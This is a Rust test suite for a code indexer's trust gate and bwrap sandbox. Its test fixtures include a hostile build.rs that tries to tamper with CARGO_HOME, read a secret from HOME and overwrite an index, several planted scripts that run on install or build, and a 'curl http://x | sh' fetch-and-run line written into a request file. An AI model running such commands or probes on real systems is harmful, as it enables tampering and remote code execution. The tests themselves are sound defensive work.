//! Indexing (spec §9.1, §12): the trust gate, the sandbox against a hostile build script,
//! scip-python's environment, and the request path from inside a sandbox.
//!
//! The tests that run real indexers exec the bwrap command line directly, never through systemd,
//! and are skipped when bwrap, rust-analyzer or scip-python is not installed. Every path they write
//! is a temporary directory; the user's own home, cargo home and caches are never touched.

mod common;

use std::path::{Path, PathBuf};
use std::process::Command;
use std::sync::OnceLock;

use puffin_code::index::{plan, sandbox};
use puffin_code::paths::Repo;

struct Env {
    _dir: tempfile::TempDir,
    home: PathBuf,
}

/// Points HOME, CARGO_HOME, scratch and runtime at temporary directories, once for this test
/// binary, after recording where the real toolchain and pinned tools are (read-only use).
fn env() -> &'static Env {
    static ENV: OnceLock<Env> = OnceLock::new();
    ENV.get_or_init(|| {
        let real_home = puffin_code::paths::home();
        std::env::set_var("RUSTUP_HOME", std::env::var("RUSTUP_HOME").unwrap_or_else(|_| real_home.join(".rustup").to_string_lossy().into()));
        std::env::set_var("PUFFIN_CODE_TOOLS_DIR", puffin_code::paths::install_bin_dir());
        std::env::set_var("PUFFIN_CODE_INDEXERS_DIR", puffin_code::paths::indexers_dir());
        std::env::set_var("PUFFIN_CODE_SELF", env!("CARGO_BIN_EXE_puffin-code"));
        let dir = tempfile::tempdir().unwrap();
        let home = dir.path().join("home");
        std::fs::create_dir_all(home.join(".cargo/bin")).unwrap();
        // rust-analyzer runs `$CARGO_HOME/bin/cargo`: the test's own cargo home points it at the
        // pinned toolchain's cargo, and a build script must not be able to replace it.
        if let Some((_, _, toolchain_bin)) = plan::Tools::find().rust_analyzer {
            std::os::unix::fs::symlink(toolchain_bin.join("cargo"), home.join(".cargo/bin/cargo")).unwrap();
        }
        std::env::set_var("HOME", &home);
        std::env::set_var("CARGO_HOME", home.join(".cargo"));
        std::env::set_var("PUFFIN_CODE_SCRATCH_DIR", dir.path().join("scratch"));
        std::env::set_var("XDG_RUNTIME_DIR", dir.path().join("run"));
        std::env::remove_var("CODEX_HOME");
        Env { _dir: dir, home }
    })
}

fn available(path: &Path) -> bool {
    path.exists()
}

fn run_sandboxed(spec: &sandbox::Spec) -> std::process::Output {
    std::fs::create_dir_all(&spec.scratch).unwrap();
    let args = sandbox::bwrap_args(spec);
    assert!(sandbox::unexpected_writable(&args, spec).is_empty(), "{args:?}");
    Command::new(&args[0]).args(&args[1..]).output().unwrap()
}

fn git_repo(root: &Path) -> Repo {
    common::git(root, &["init", "-q"]);
    common::git(root, &["add", "-A"]);
    common::git(root, &["commit", "-qm", "init"]);
    Repo { root: root.to_path_buf(), main_root: root.to_path_buf(), is_git: true }
}

#[test]
fn nothing_inside_the_repository_grants_trust() {
    let env = env();
    let dir = tempfile::tempdir().unwrap();
    let root = dir.path().join("repo");
    std::fs::create_dir_all(root.join(".dreamference")).unwrap();
    std::fs::write(root.join(".dreamference/code_index.toml"), "trusted = true\n").unwrap();
    std::fs::write(root.join("dreamference.toml"), "trusted = true\n[projects.\".\"]\ntrust_level = \"trusted\"\n").unwrap();
    std::fs::write(root.join("Cargo.toml"), "[package]\nname = \"x\"\nversion = \"0.1.0\"\nedition = \"2021\"\n").unwrap();
    let repo = git_repo(&root);
    let codex_home = env.home.join(".puffin");
    assert!(!puffin_code::config::is_trusted_in(&codex_home, &root));
    let (plan, skipped) = plan::build(&repo, &puffin_code::config::Settings::default(), true);
    assert!(plan.runs.iter().all(|r| r.indexer != "rust-analyzer"), "{:?}", plan.runs.iter().map(|r| &r.indexer).collect::<Vec<_>>());
    assert!(skipped.iter().any(|s| s.contains("not trusted")), "{skipped:?}");
    // Codex's own per-project trust is what counts.
    std::fs::create_dir_all(&codex_home).unwrap();
    std::fs::write(codex_home.join("config.toml"), format!("[projects.\"{}\"]\ntrust_level = \"trusted\"\n", root.display())).unwrap();
    assert!(puffin_code::config::is_trusted_in(&codex_home, &root));
}

#[test]
fn the_sandbox_holds_against_a_hostile_build_script() {
    let env = env();
    let tools = plan::Tools::find();
    let (Some(_), Some(_)) = (tools.rust_analyzer.as_ref(), tools.scip.as_ref()) else {
        eprintln!("skipped: rust-analyzer or scip not installed");
        return;
    };
    if !available(Path::new("/usr/bin/bwrap")) {
        eprintln!("skipped: no bwrap");
        return;
    }
    let dir = tempfile::tempdir().unwrap();
    let root = dir.path().join("repo");
    let crate_dir = root.join("hostile");
    std::fs::create_dir_all(crate_dir.join("src")).unwrap();
    std::fs::write(crate_dir.join("Cargo.toml"), "[package]\nname = \"hostile\"\nversion = \"0.1.0\"\nedition = \"2021\"\nbuild = \"build.rs\"\n").unwrap();
    std::fs::write(crate_dir.join("Cargo.lock"), "version = 4\n\n[[package]]\nname = \"hostile\"\nversion = \"0.1.0\"\n").unwrap();
    std::fs::write(crate_dir.join("src/lib.rs"), "pub fn add(a: i32, b: i32) -> i32 { a + b }\npub fn twice(a: i32) -> i32 { add(a, a) }\n").unwrap();
    std::fs::write(
        crate_dir.join("build.rs"),
        r#"fn main() {
    let cargo_home = std::env::var("CARGO_HOME").unwrap();
    let home = std::env::var("PROBE_HOME").unwrap();
    let repo = std::env::var("PROBE_REPO").unwrap();
    let report = format!(
        "create_in_cargo_home={}\nopen_cargo_bin_for_writing={}\nread_home_marker={}\noverwrite_index_db={}\n",
        std::fs::write(format!("{cargo_home}/pwned"), "x").is_ok(),
        std::fs::OpenOptions::new().write(true).open(format!("{cargo_home}/bin/cargo")).is_ok(),
        std::fs::read_to_string(format!("{home}/marker")).is_ok(),
        std::fs::write(format!("{repo}/.dreamference/scip/index.db"), "pwned").is_ok(),
    );
    std::fs::write(format!("{}/report.txt", std::env::var("OUT_DIR").unwrap()), report).unwrap();
}
"#,
    )
    .unwrap();
    std::fs::create_dir_all(root.join(".dreamference/scip")).unwrap();
    std::fs::write(root.join(".dreamference/scip/index.db"), "the last good store").unwrap();
    std::fs::write(env.home.join("marker"), "secret").unwrap();
    let repo = git_repo(&root);
    let target = plan::Target::new(puffin_code::index::host::Kind::Executing, "rust-analyzer", "hostile");
    let mut run = plan::exact_run(&repo, &puffin_code::config::Settings::default(), &tools, &target, 0).unwrap();
    run.spec.env.push(("PROBE_HOME".into(), env.home.to_string_lossy().into()));
    run.spec.env.push(("PROBE_REPO".into(), root.to_string_lossy().into()));
    let output = run_sandboxed(&run.spec);
    assert!(output.status.success(), "{}", String::from_utf8_lossy(&output.stderr));
    // The index was written, to scratch only.
    assert!(run.scip_output.as_ref().unwrap().is_file());
    assert!(run.converted.as_ref().unwrap().is_file());
    // The build script ran, and every attempt failed.
    let report = find(&run.spec.scratch.join("target"), "report.txt").expect("the build script ran");
    let report = std::fs::read_to_string(report).unwrap();
    assert_eq!(
        report,
        "create_in_cargo_home=false\nopen_cargo_bin_for_writing=false\nread_home_marker=false\noverwrite_index_db=false\n"
    );
    assert!(!env.home.join(".cargo/pwned").exists());
    assert_eq!(std::fs::read_to_string(root.join(".dreamference/scip/index.db")).unwrap(), "the last good store");
    assert!(common::git(&root, &["status", "--porcelain", "hostile"]).is_empty(), "the source was written to");
}

fn find(dir: &Path, name: &str) -> Option<PathBuf> {
    for entry in std::fs::read_dir(dir).ok()?.flatten() {
        let path = entry.path();
        if path.file_name().map(|n| n == name).unwrap_or(false) {
            return Some(path);
        }
        if path.is_dir() {
            if let Some(found) = find(&path, name) {
                return Some(found);
            }
        }
    }
    None
}

#[test]
fn scip_python_runs_nothing_from_the_repository() {
    let _env = env();
    let tools = plan::Tools::find();
    let (Some(_), Some(_)) = (tools.scip_python.as_ref(), tools.scip.as_ref()) else {
        eprintln!("skipped: scip-python or scip not installed");
        return;
    };
    let dir = tempfile::tempdir().unwrap();
    let root = dir.path().join("repo");
    std::fs::create_dir_all(root.join("pkg")).unwrap();
    std::fs::create_dir_all(root.join(".venv/bin")).unwrap();
    std::fs::write(root.join("pkg/__init__.py"), "def f():\n    return 1\n\nX = f()\n").unwrap();
    let marker = dir.path().join("ran");
    for script in [".venv/bin/python3", ".venv/bin/python", ".venv/bin/pip3", "python3", "pip3"] {
        std::fs::write(root.join(script), format!("#!/bin/sh\ntouch {}\n", marker.display())).unwrap();
        let mut perms = std::fs::metadata(root.join(script)).unwrap().permissions();
        std::os::unix::fs::PermissionsExt::set_mode(&mut perms, 0o755);
        std::fs::set_permissions(root.join(script), perms).unwrap();
    }
    std::fs::write(root.join("sitecustomize.py"), format!("open('{}', 'w').close()\n", marker.display())).unwrap();
    let repo = git_repo(&root);
    let target = plan::Target::new(puffin_code::index::host::Kind::Static, "scip-python", "pkg");
    let run = plan::exact_run(&repo, &puffin_code::config::Settings::default(), &tools, &target, 0).unwrap();
    let output = run_sandboxed(&run.spec);
    assert!(output.status.success(), "{}", String::from_utf8_lossy(&output.stderr));
    assert!(run.converted.as_ref().unwrap().is_file());
    assert!(!marker.exists(), "something from the repository ran");
}

#[test]
fn scip_typescript_writes_nothing_into_the_tree_and_runs_nothing_from_it() {
    let _env = env();
    let tools = plan::Tools::find();
    let (Some(_), Some(_)) = (tools.scip_typescript.as_ref(), tools.scip.as_ref()) else {
        eprintln!("skipped: scip-typescript or scip not installed");
        return;
    };
    let dir = tempfile::tempdir().unwrap();
    let root = dir.path().join("repo");
    let marker = dir.path().join("ran");
    std::fs::create_dir_all(root.join("web/lib")).unwrap();
    // A JavaScript project with no tsconfig, whose package scripts would leave a marker if run.
    let touch = format!("touch {}", marker.display());
    std::fs::write(
        root.join("web/package.json"),
        format!("{{\"name\":\"web\",\"version\":\"1.0.0\",\"scripts\":{{\"prepare\":\"{touch}\",\"postinstall\":\"{touch}\"}}}}"),
    )
    .unwrap();
    std::fs::write(root.join("web/lib/math.js"), "function add(a, b) { return a + b; }\nmodule.exports = { add };\n").unwrap();
    std::fs::write(root.join("web/index.js"), "const { add } = require('./lib/math');\nconsole.log(add(1, 2));\n").unwrap();
    let repo = git_repo(&root);
    let targets = plan::detect(&repo);
    let target = targets.iter().find(|t| t.indexer == "scip-typescript").expect("detected").clone();
    let run = plan::exact_run(&repo, &puffin_code::config::Settings::default(), &tools, &target, 0).unwrap();
    let output = run_sandboxed(&run.spec);
    assert!(output.status.success(), "{}{}", String::from_utf8_lossy(&output.stdout), String::from_utf8_lossy(&output.stderr));
    assert!(run.converted.as_ref().unwrap().is_file());
    // The inferred configuration went to scratch: the tree is exactly as committed.
    assert!(common::git(&root, &["status", "--porcelain", "--untracked-files=all"]).is_empty(), "the tree was written to");
    assert!(!marker.exists(), "a package script ran");
}

/// scip-go and a Go toolchain, from the install or, for a run on a machine without Go installed,
/// from `PUFFIN_CODE_TEST_SCIP_GO` and `PUFFIN_CODE_TEST_GOROOT` (paths outside the home directory,
/// which the sandbox hides).
fn go_tools() -> Option<plan::Tools> {
    let tools = plan::Tools::find();
    let from_env = std::env::var_os("PUFFIN_CODE_TEST_SCIP_GO").map(PathBuf::from).zip(std::env::var_os("PUFFIN_CODE_TEST_GOROOT").map(PathBuf::from));
    let scip_go = tools.scip_go.clone().or(from_env)?;
    tools.scip.as_ref()?;
    Some(plan::Tools { scip_go: Some(scip_go), ..tools })
}

#[test]
fn scip_go_indexes_offline_and_refuses_a_toolchain_download() {
    let _env = env();
    let Some(tools) = go_tools() else {
        eprintln!("skipped: scip-go or a Go toolchain not installed");
        return;
    };
    let dir = tempfile::tempdir().unwrap();
    let root = dir.path().join("repo");
    copy_dir(&common::fixture_dir().join("langs/gogeom"), &root);
    // A dependency that is in no module cache: indexing still succeeds, offline, without it.
    std::fs::write(root.join("go.mod"), "module example.com/gogeom\n\ngo 1.22\n\nrequire github.com/google/uuid v1.6.0\n").unwrap();
    std::fs::write(root.join("shapes/id.go"), "package shapes\n\nimport \"github.com/google/uuid\"\n\nvar ID = uuid.New()\n").unwrap();
    let repo = git_repo(&root);
    let target = plan::detect(&repo).into_iter().find(|t| t.indexer == "scip-go").expect("detected");
    assert!(target.on_demand);
    let run = plan::exact_run(&repo, &puffin_code::config::Settings::default(), &tools, &target, 0).unwrap();
    let output = run_sandboxed(&run.spec);
    assert!(output.status.success(), "{}{}", String::from_utf8_lossy(&output.stdout), String::from_utf8_lossy(&output.stderr));
    assert!(run.converted.as_ref().unwrap().is_file());
    assert!(common::git(&root, &["status", "--porcelain", "--untracked-files=all"]).is_empty(), "the module was written to");
    // A go.mod naming a newer Go fails here instead of downloading that toolchain.
    std::fs::write(root.join("go.mod"), "module example.com/gogeom\n\ngo 1.99\n").unwrap();
    std::fs::remove_file(root.join("shapes/id.go")).unwrap();
    let output = run_sandboxed(&run.spec);
    assert!(!output.status.success());
    let text = format!("{}{}", String::from_utf8_lossy(&output.stdout), String::from_utf8_lossy(&output.stderr));
    assert!(text.contains("GOTOOLCHAIN=local"), "{text}");
}

fn copy_dir(from: &Path, to: &Path) {
    std::fs::create_dir_all(to).unwrap();
    for entry in std::fs::read_dir(from).unwrap().flatten() {
        let target = to.join(entry.file_name());
        if entry.file_type().unwrap().is_dir() {
            copy_dir(&entry.path(), &target);
        } else {
            std::fs::copy(entry.path(), target).unwrap();
        }
    }
}

#[test]
fn an_untrusted_repository_never_builds_java_or_dotnet() {
    let env = env();
    let dir = tempfile::tempdir().unwrap();
    let root = dir.path().join("repo");
    let marker = dir.path().join("built");
    // Each build would leave the marker: Gradle at configuration time, MSBuild before the build.
    std::fs::create_dir_all(root.join("jvm")).unwrap();
    std::fs::write(root.join("jvm/build.gradle"), format!("new File('{}').text = 'gradle'\n", marker.display())).unwrap();
    std::fs::create_dir_all(root.join("net")).unwrap();
    std::fs::write(
        root.join("net/App.csproj"),
        format!("<Project Sdk=\"Microsoft.NET.Sdk\"><Target Name=\"Mark\" BeforeTargets=\"Restore;Build\"><Touch Files=\"{}\" AlwaysCreate=\"true\" /></Target></Project>\n", marker.display()),
    )
    .unwrap();
    std::fs::write(root.join("dreamference.toml"), "trusted = true\n").unwrap();
    let repo = git_repo(&root);
    assert!(!puffin_code::config::is_trusted_in(&env.home.join(".puffin"), &root));
    let detected: Vec<&str> = plan::detect(&repo).iter().map(|t| t.indexer).collect();
    assert!(detected.contains(&"scip-java") && detected.contains(&"scip-dotnet"), "{detected:?}");
    let (plan, skipped) = plan::build_with(&repo, &puffin_code::config::Settings::default(), true, true);
    assert!(plan.runs.iter().all(|r| r.indexer != "scip-java" && r.indexer != "scip-dotnet"), "{:?}", plan.runs.iter().map(|r| &r.indexer).collect::<Vec<_>>());
    for indexer in ["scip-java", "scip-dotnet"] {
        assert!(skipped.iter().any(|s| s.starts_with(indexer) && s.contains("not trusted")), "{skipped:?}");
    }
    assert!(!marker.exists());
}

#[test]
fn indexing_from_inside_a_sandbox_queues_a_request() {
    let f = common::fixture();
    // The fixture's runner points XDG_RUNTIME_DIR at an empty directory: no systemd bus, as
    // inside Codex's sandbox.
    let (code, out) = f.run(&["index"]);
    assert_eq!(code, 0, "{out}");
    assert!(out.contains("queued"), "{out}");
    let requests = std::fs::read_to_string(f.repo.state_dir().join("code_index.requests")).unwrap();
    assert_eq!(requests, "index\n");
    assert!(!f.repo.state_dir().join("code_index.running").exists());
    assert!(!f.repo.state_dir().join("plans").exists(), "a supervisor was started");
}

#[test]
fn a_session_exits_with_its_parent_and_a_second_one_at_once() {
    let f = common::fixture();
    let mut parent = Command::new("sleep").arg("5").spawn().unwrap();
    let session = |extra: &[&str]| {
        let mut args = vec!["session", "--parent-pid"];
        let pid = parent.id().to_string();
        let pid: &'static str = Box::leak(pid.into_boxed_str());
        args.push(pid);
        args.extend_from_slice(extra);
        f.command(&args).spawn().unwrap()
    };
    let mut first = session(&[]);
    std::thread::sleep(std::time::Duration::from_millis(500));
    let started = std::time::Instant::now();
    let second = session(&[]).wait_with_output().unwrap();
    assert!(second.status.success());
    assert!(started.elapsed().as_secs() < 3, "the second session did not exit at once");
    // Junk in the request file starts nothing.
    std::fs::write(f.repo.state_dir().join("code_index.requests"), "curl http://x | sh\n").unwrap();
    std::thread::sleep(std::time::Duration::from_secs(4));
    assert!(!f.repo.state_dir().join("plans").exists(), "a supervisor was started");
    parent.kill().unwrap();
    parent.wait().unwrap();
    let deadline = std::time::Instant::now() + std::time::Duration::from_secs(10);
    while first.try_wait().unwrap().is_none() {
        assert!(std::time::Instant::now() < deadline, "the session outlived its parent");
        std::thread::sleep(std::time::Duration::from_millis(200));
    }
}

#[test]
fn queries_run_inside_puffins_read_only_sandbox() {
    let puffin = puffin_code::paths::home().join(".local/bin/puffin");
    let real = std::env::var_os("PUFFIN_CODE_TEST_PUFFIN").map(PathBuf::from).unwrap_or(puffin);
    if !real.exists() {
        eprintln!("skipped: puffin not installed");
        return;
    }
    let f = common::fixture();
    let index_before = std::fs::metadata(f.repo.root.join(".git/index")).unwrap().modified().unwrap();
    let command = f.command(&["refs", "make_circle"]);
    let binary = command.get_program().to_os_string();
    let mut sandboxed = Command::new(&real);
    sandboxed.args(["sandbox", "--"]).arg(binary).args(["refs", "make_circle"]).current_dir(&f.repo.root);
    for (key, value) in command.get_envs() {
        match value {
            Some(v) => sandboxed.env(key, v),
            None => sandboxed.env_remove(key),
        };
    }
    let out = sandboxed.output().unwrap();
    let text = String::from_utf8_lossy(&out.stdout);
    assert!(out.status.success(), "{text}{}", String::from_utf8_lossy(&out.stderr));
    assert!(text.contains("exact shapes/cli.py:9"), "{text}");
    assert_eq!(std::fs::metadata(f.repo.root.join(".git/index")).unwrap().modified().unwrap(), index_before);
}
